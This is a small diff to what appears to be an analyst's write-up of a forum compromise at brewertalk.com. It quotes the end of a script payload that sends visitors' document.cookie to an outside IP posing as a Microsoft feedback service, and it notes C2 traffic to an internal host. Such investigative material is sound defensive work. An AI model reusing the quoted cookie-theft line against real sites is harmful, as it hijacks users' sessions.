@@ -1075,7 +1075,7 @@ Unencoded %coded section:
 "http://45.77.65.211:9999/microsoftuserfeedbackservice?metric="
 + document.cookie;</script>
 ```   
-Changing scan to dest_port=80 shows what appears to be a lot of traffic to 45.77.65.211 but this seem not not be beaconing purpose. Seem be all from C2 to another internal IP 172.31.4.249, which seems to be more of attack than a on the internal site than beaconing action in place. event log is long but initially connects to send POST packets to www.brewertalk.com/member.php HTTP/1.1, with high frequency 1-3 events per second.
+Changing scan to dest_port=80 shows what appears to be a lot of traffic to 45.77.65.211 but this seem not not be beaconing purpose as its incoming. Seem be all from C2 to another internal IP 172.31.4.249, which seems to be more of attack than a on the internal site than beaconing action in place. event log is long but initially connects to send POST packets to www.brewertalk.com/member.php HTTP/1.1, with high frequency 1-3 events per second.
 ```
 </head>
 <body>...		<p>MyBB has experienced an internal SQL error and cannot continue.</p><dl>
